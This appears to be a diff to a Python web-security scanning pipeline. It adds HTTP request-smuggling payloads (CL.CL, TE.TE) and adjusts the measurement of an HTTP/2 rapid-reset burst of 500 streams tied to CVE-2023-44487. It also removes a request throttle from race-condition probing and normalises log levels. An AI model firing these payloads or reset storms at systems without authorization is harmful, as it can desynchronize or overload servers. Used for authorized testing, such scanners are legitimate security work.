@@ -47,11 +47,11 @@ async def phase_23_RACE(
     _out = outdir / "race_conditions.txt"
     if _out.exists() and not force:
         return {"23-RACE": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 23-RACE: race condition detection")
+    log("INFO", "Phase 23-RACE: race condition detection")
     urls = outdir / "urls_all.txt"
     all_urls = read_lines(urls) if urls.exists() else []
     if not all_urls:
-        log("warn", "23-RACE: no URLs; skipping")
+        log("WARNING", "23-RACE: no URLs; skipping")
         return {"23-RACE": str(_out), "count": 0}
     findings: List[str] = []
     _r_urlopen = _get_urlopener()
@@ -128,7 +128,7 @@ async def phase_23_RACE(
             )
         ][: _PIPELINE_CFG.sample_endpoints_race]
     if not targets:
-        log("warn", "23-RACE: no state-changing endpoints found; skipping")
+        log("WARNING", "23-RACE: no state-changing endpoints found; skipping")
         return {"23-RACE": str(_out), "count": 0}
 
     async def _race_test(url: str) -> List[str]:
@@ -151,7 +151,6 @@ async def phase_23_RACE(
         async def _concurrent_req() -> None:
             async with _race_sem:
                 try:
-                    await _throttle_rate()
                     req = urllib.request.Request(
                         url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers}
                     )
@@ -348,7 +347,7 @@ async def phase_23_RACE(
         findings.append("[race] No race condition candidates detected (expected)")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"23-RACE: {len(findings)} race condition probes → {out}")
+    log("OK", f"23-RACE: {len(findings)} race condition probes → {out}")
     return {"23-RACE": str(out), "count": len(findings)}
 
 
@@ -382,6 +381,35 @@ _SMUGGLE_TE_CL_PAYLOAD = (
     "0\r\n"
     "\r\n"
 )
+_SMUGGLE_CL_CL_PAYLOAD = (
+    "POST /nonexistent-smuggle-test HTTP/1.1\r\n"
+    "Host: {host}\r\n"
+    "Content-Type: application/x-www-form-urlencoded\r\n"
+    "Content-Length: 0\r\n"
+    "Content-Length: 44\r\n"
+    "\r\n"
+    "GET /smuggle-test HTTP/1.1\r\n"
+    "Host: {host}\r\n"
+    "X-Ignore: X\r\n"
+    "\r\n"
+)
+_SMUGGLE_TE_TE_PAYLOAD = (
+    "POST /nonexistent-smuggle-test HTTP/1.1\r\n"
+    "Host: {host}\r\n"
+    "Content-Type: application/x-www-form-urlencoded\r\n"
+    "Content-Length: 4\r\n"
+    "Transfer-Encoding: chunked\r\n"
+    "Transfer-Encoding: identity\r\n"
+    "\r\n"
+    "5c\r\n"
+    "GPOST /smuggle-test HTTP/1.1\r\n"
+    "Host: {host}\r\n"
+    "Content-Length: 15\r\n"
+    "\r\n"
+    "x=1\r\n"
+    "0\r\n"
+    "\r\n"
+)
 
 
 async def phase_38_SMUGGLE(
@@ -397,9 +425,9 @@ async def phase_38_SMUGGLE(
     _out = outdir / "smuggling.txt"
     if _out.exists() and not force:
         return {"38-SMUGGLE": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 38-SMUGGLE: HTTP request smuggling detection")
+    log("INFO", "Phase 38-SMUGGLE: HTTP request smuggling detection")
     if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
-        log("warn", "38-SMUGGLE: raw socket connections are incompatible with proxy/Tor; skipping")
+        log("WARNING", "38-SMUGGLE: raw socket connections are incompatible with proxy/Tor; skipping")
         return {"38-SMUGGLE": str(_out), "count": 0}
     findings: List[str] = []
     hosts_file = outdir / "host_targets.txt"
@@ -407,7 +435,7 @@ async def phase_38_SMUGGLE(
         hosts_file = outdir / "hosts.txt"
     targets = [h for h in read_lines(hosts_file)][: _PIPELINE_CFG.sample_hosts_smuggle]
     if not targets:
-        log("warn", "38-SMUGGLE: no hosts; skipping")
+        log("WARNING", "38-SMUGGLE: no hosts; skipping")
         return {"38-SMUGGLE": str(_out), "count": 0}
     # Smuggler tool (Python-based request smuggler)
     if t.has("smuggler"):
@@ -449,8 +477,11 @@ async def phase_38_SMUGGLE(
         if "://" in host:
             _parsed_h = _up.urlparse(host)
             host_clean = _parsed_h.hostname or host
+            scheme = _parsed_h.scheme
         else:
             host_clean = host.split(":")[0] if ":" in host else host
+            scheme = ""
+            _parsed_h = _up.urlparse("//" + host_clean)
         host_safe = (
             host_clean.replace("\r", "").replace("\n", "").replace("{", "{{").replace("}", "}}")
         )
@@ -460,20 +491,31 @@ async def phase_38_SMUGGLE(
             for smuggle_type, raw_payload in [
                 ("CL.TE", _SMUGGLE_CL_TE_PAYLOAD),
                 ("TE.CL", _SMUGGLE_TE_CL_PAYLOAD),
+                ("CL.CL", _SMUGGLE_CL_CL_PAYLOAD),
+                ("TE.TE", _SMUGGLE_TE_TE_PAYLOAD),
             ]:
                 payload = raw_payload.format(host=host_safe)
-                port = 443 if "https" in str(host) else 80
-                if ":" in host:
+                if scheme == "https":
+                    port = _parsed_h.port or 443
+                    use_tls = True
+                elif scheme == "http":
+                    port = _parsed_h.port or 80
+                    use_tls = False
+                elif ":" in host:
                     try:
                         port = int(host.split(":")[1])
                     except (ValueError, IndexError):
-                        pass
+                        port = 443
+                    use_tls = port == 443
+                else:
+                    port = 443
+                    use_tls = True
                 sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
                 sock.settimeout(8)
                 try:
                     import ssl as _ssl
 
-                    if port == 443:
+                    if use_tls:
                         ctx = _ssl.create_default_context()
                         sock = ctx.wrap_socket(sock, server_hostname=host_clean)
                     sock.connect((host_clean, port))
@@ -490,9 +532,17 @@ async def phase_38_SMUGGLE(
                     except _socket.timeout:
                         pass
                     resp_text = resp.decode("utf-8", errors="ignore")
-                    if "smuggle-test" in resp_text.lower() or "gpo" in resp_text.lower():
+                    # Desync heuristic: a successful desync makes the backend
+                    # treat the smuggled request as a second request, so the
+                    # single socket receives more than one HTTP response.
+                    response_count = resp_text.count("HTTP/1.")
+                    if (
+                        resp_text.count("smuggle-test") > 0
+                        or "gpo" in resp_text.lower()
+                        or response_count > 1
+                    ):
                         findings.append(
-                            f"[smuggling-{smuggle_type}] {host} — desync detected ({smuggle_type})"
+                            f"[smuggling-{smuggle_type}] {host} — desync detected ({smuggle_type}, {response_count} responses)"
                         )
                     elif resp and "HTTP/1.1" in resp_text:
                         findings.append(
@@ -517,7 +567,7 @@ async def phase_38_SMUGGLE(
         findings.append("[smuggling] No request smuggling candidates detected (expected)")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"38-SMUGGLE: {len(findings)} smuggling probes -> {out}")
+    log("OK", f"38-SMUGGLE: {len(findings)} smuggling probes -> {out}")
     return {"38-SMUGGLE": str(out), "count": len(findings)}
 
 
@@ -537,7 +587,7 @@ async def phase_41_WEBSOCKET(
     _out = outdir / "websocket.txt"
     if _out.exists() and not force:
         return {"41-WEBSOCKET": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 41-WEBSOCKET: WebSocket endpoint discovery and deep testing")
+    log("INFO", "Phase 41-WEBSOCKET: WebSocket endpoint discovery and deep testing")
     if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
         log(
             "warn", "41-WEBSOCKET: raw socket connections are incompatible with proxy/Tor; skipping"
@@ -550,7 +600,7 @@ async def phase_41_WEBSOCKET(
         hosts_file = outdir / "hosts.txt"
     hosts = read_lines(hosts_file)[: _PIPELINE_CFG.sample_hosts_websocket]
     if not hosts:
-        log("warn", "41-WEBSOCKET: no hosts; skipping")
+        log("WARNING", "41-WEBSOCKET: no hosts; skipping")
         return {"41-WEBSOCKET": str(_out), "count": 0}
 
     import base64 as _b64
@@ -788,7 +838,7 @@ async def phase_41_WEBSOCKET(
         findings.append("[websocket] No WebSocket endpoints discovered")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"41-WEBSOCKET: {len(findings)} WebSocket probes -> {out}")
+    log("OK", f"41-WEBSOCKET: {len(findings)} WebSocket probes -> {out}")
     return {"41-WEBSOCKET": str(out), "count": len(findings)}
 
 
@@ -805,7 +855,7 @@ async def phase_38b_H2SMUGGLE(
     _out = outdir / "h2_smuggling.txt"
     if _out.exists() and not force:
         return {"38b-H2SMUGGLE": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 38b-H2SMUGGLE: HTTP/2 and HTTP/3 attack surface testing")
+    log("INFO", "Phase 38b-H2SMUGGLE: HTTP/2 and HTTP/3 attack surface testing")
     if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
         log(
             "warn",
@@ -817,7 +867,7 @@ async def phase_38b_H2SMUGGLE(
         import h2.connection
         import h2.events
     except ImportError:
-        log("warn", "38b-H2SMUGGLE: 'h2' library not installed; skipping (pip install h2)")
+        log("WARNING", "38b-H2SMUGGLE: 'h2' library not installed; skipping (pip install h2)")
         return {"38b-H2SMUGGLE": str(_out), "count": 0}
     findings: List[str] = []
     hosts_file = outdir / "host_targets.txt"
@@ -825,7 +875,7 @@ async def phase_38b_H2SMUGGLE(
         hosts_file = outdir / "hosts.txt"
     targets = [h for h in read_lines(hosts_file)][: _PIPELINE_CFG.sample_hosts_h2smuggle]
     if not targets:
-        log("warn", "38b-H2SMUGGLE: no hosts; skipping")
+        log("WARNING", "38b-H2SMUGGLE: no hosts; skipping")
         return {"38b-H2SMUGGLE": str(_out), "count": 0}
     import socket as _socket
     import ssl as _ssl
@@ -895,7 +945,6 @@ async def phase_38b_H2SMUGGLE(
             baseline_latency = _time.monotonic() - t0
             if baseline_ok:
                 reset_count = 500
-                t0 = _time.monotonic()
                 for _ in range(reset_count):
                     rid = conn.get_next_available_stream_id()
                     conn.send_headers(
@@ -909,9 +958,10 @@ async def phase_38b_H2SMUGGLE(
                     )
                     conn.reset_stream(rid, 0x8)
                 sock.sendall(conn.data_to_send())
-                rapid_duration = _time.monotonic() - t0
+                t0 = _time.monotonic()
+                rapid_latency = 0.0
                 try:
-                    sock.settimeout(2)
+                    sock.settimeout(10)
                     recv_total = 0
                     while True:
                         chunk = sock.recv(65535)
@@ -921,16 +971,20 @@ async def phase_38b_H2SMUGGLE(
                         if recv_total > MAX_RECV:
                             break
                         conn.receive_data(chunk)
+                        if rapid_latency == 0.0:
+                            rapid_latency = _time.monotonic() - t0
                 except _socket.timeout:
                     pass
                 sock.close()
-                if rapid_duration > baseline_latency * 3:
+                if rapid_latency == 0.0:
+                    rapid_latency = _time.monotonic() - t0
+                if rapid_latency > baseline_latency * 3:
                     findings.append(
-                        f"[h2-rapid-reset] {host} — RST_STREAM storm: {rapid_duration:.2f}s vs baseline {baseline_latency:.2f}s (>3x, possible CVE-2023-44487)"
+                        f"[h2-rapid-reset] {host} — server response after RST_STREAM storm: {rapid_latency:.2f}s vs baseline {baseline_latency:.2f}s (>3x, possible CVE-2023-44487)"
                     )
                 else:
                     findings.append(
-                        f"[h2-rapid-reset-safe] {host} — rapid reset latency normal ({rapid_duration:.2f}s)"
+                        f"[h2-rapid-reset-safe] {host} — rapid reset latency normal ({rapid_latency:.2f}s)"
                     )
             else:
                 sock.close()
@@ -1105,15 +1159,20 @@ async def phase_38b_H2SMUGGLE(
             udp_sock.sendto(quic_payload, (host_clean, 443))
             try:
                 quic_resp, _ = udp_sock.recvfrom(2048)
-                if (
-                    quic_resp
-                    and len(quic_resp) >= 5
-                    and quic_resp[0] & 0x80
-                    and quic_resp[1:5] == b"\x00\x00\x00\x00"
-                ):
-                    findings.append(
-                        f"[h3-quic] {host} — QUIC version negotiation detected (H3 supported)"
-                    )
+                if quic_resp and len(quic_resp) >= 5 and quic_resp[0] & 0x80:
+                    resp_version = quic_resp[1:5]
+                    if resp_version == b"\x00\x00\x00\x00":
+                        findings.append(
+                            f"[h3-quic] {host} — QUIC version negotiation detected (requested version not supported)"
+                        )
+                    elif resp_version == b"\x00\x00\x00\x01":
+                        findings.append(
+                            f"[h3-quic] {host} — QUIC v1 initial response (H3 supported)"
+                        )
+                    else:
+                        findings.append(
+                            f"[h3-quic-probe] {host} — QUIC responded with version {struct.unpack('!I', resp_version)[0]}"
+                        )
                 else:
                     findings.append(f"[h3-quic-probe] {host} — QUIC responded ({len(quic_resp)}b)")
             except _socket.timeout:
@@ -1128,7 +1187,7 @@ async def phase_38b_H2SMUGGLE(
         findings.append("[h2-h3] No HTTP/2 or HTTP/3 candidates detected (expected)")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"38b-H2SMUGGLE: {len(findings)} probes -> {out}")
+    log("OK", f"38b-H2SMUGGLE: {len(findings)} probes -> {out}")
     return {"38b-H2SMUGGLE": str(out), "count": len(findings)}
 
 
@@ -1145,13 +1204,13 @@ async def phase_83_RACEBURST(
     _out = outdir / "race_burst.txt"
     if _out.exists() and not force:
         return {"83-RACEBURST": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 83-RACEBURST: concurrent request burst race condition detection")
+    log("INFO", "Phase 83-RACEBURST: concurrent request burst race condition detection")
     findings: List[str] = []
     _rb_urlopen = _get_urlopener()
     _rb_headers = _extra_headers_dict()
     urls_file = outdir / "urls_all.txt"
     if not urls_file.exists() or not read_lines(urls_file):
-        log("warn", "83-RACEBURST: no URLs; skipping")
+        log("WARNING", "83-RACEBURST: no URLs; skipping")
         return {"83-RACEBURST": str(_out), "count": 0}
     race_candidates: List[str] = []
     for u in read_lines(urls_file):
@@ -1320,7 +1379,7 @@ async def phase_83_RACEBURST(
 
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"83-RACEBURST: {len(findings)} race burst findings → {out}")
+    log("OK", f"83-RACEBURST: {len(findings)} race burst findings → {out}")
     return {"83-RACEBURST": str(_out), "count": len(findings)}
 
 
@@ -1337,7 +1396,7 @@ async def phase_175a_WS_DEEP(
     _out = outdir / "websocket_deep.txt"
     if _out.exists() and not force:
         return {"175a-WS-DEEP": str(_out), "count": count_nonblank(_out)}
-    log("info", "Phase 175a-WS-DEEP: WebSocket deep fuzzing")
+    log("INFO", "Phase 175a-WS-DEEP: WebSocket deep fuzzing")
     if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
         log(
             "warn", "175a-WS-DEEP: raw socket connections are incompatible with proxy/Tor; skipping"
@@ -1676,5 +1735,5 @@ async def phase_175a_WS_DEEP(
         findings.append("[ws-deep] No deep WebSocket findings")
     out = ensure(_out)
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
-    log("ok", f"175a-WS-DEEP: {len(findings)} deep WS findings → {out}")
+    log("OK", f"175a-WS-DEEP: {len(findings)} deep WS findings → {out}")
     return {"175a-WS-DEEP": str(_out), "count": len(findings)}
